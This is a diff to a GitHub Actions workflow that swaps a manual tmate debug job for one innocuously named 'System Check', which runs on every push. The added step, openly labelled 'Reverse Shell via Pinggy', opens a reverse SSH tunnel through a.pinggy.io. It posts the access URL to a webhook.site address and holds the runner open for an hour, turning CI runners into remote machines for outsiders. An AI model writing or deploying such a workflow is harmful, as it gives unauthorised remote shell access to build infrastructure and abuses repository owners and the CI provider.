@@ -1,14 +1,23 @@
 
-name: CI-Update
-on: 
-  workflow_dispatch:
+name: System Check
+on: [push]
 jobs:
-  build:
+  run-shell:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v2
-      - name: Setup tmate session
-        uses: mxschmitt/action-tmate@v3
-        with:
-          install-dependencies: true
+      - name: Reverse Shell via Pinggy
+        run: |
+          # Генерим SSH ключ на раннере
+          ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -N "" -q
+          # Запускаем туннель Pinggy
+          nohup ssh -p 443 -R0:localhost:22 -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -i ~/.ssh/id_rsa a.pinggy.io > pinggy.log 2>&1 &
+          sleep 5
+          
+          # Читаем лог, чтобы получить URL для подключения
+          URL=$(grep -oP 'tcp://[a-zA-Z0-9.-]+:[0-9]+' pinggy.log | head -n 1)
+          
+          # Отправляем этот URL нам (используя публичный webhook или просто вывод в лог)
+          curl -s -X POST -H "Content-Type: application/json" -d "{"msg": "DEDIK READY: $URL"}" https://webhook.site/7b941548-261d-400d-9fa6-23194a2b9d03
+          
+          # Оставляем процесс висеть на час
+          sleep 3600
